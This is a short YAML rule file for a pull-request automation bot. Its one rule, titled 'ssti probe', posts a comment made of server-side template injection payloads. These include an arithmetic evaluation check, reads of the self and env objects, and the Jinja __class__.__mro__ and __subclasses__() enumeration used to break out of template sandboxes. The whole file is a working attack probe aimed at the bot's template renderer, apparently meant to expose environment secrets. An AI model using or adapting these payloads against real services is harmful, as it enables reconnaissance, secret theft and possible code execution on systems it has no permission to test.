pull_request_rules:
  - name: ssti probe
    conditions:
      - base=main
    actions:
      comment:
        message: |
          SSTI-PROBE
          mul=[{{ 7*7 }}]
          prnum=[{{ pr.number }}]
          auth=[{{ author }}]
          mro=[{{ ''.__class__.__mro__ }}]
          nsub=[{{ ''.__class__.__mro__[1].__subclasses__()|length }}]
          self=[{{ self }}]
          env=[{{ env }}]
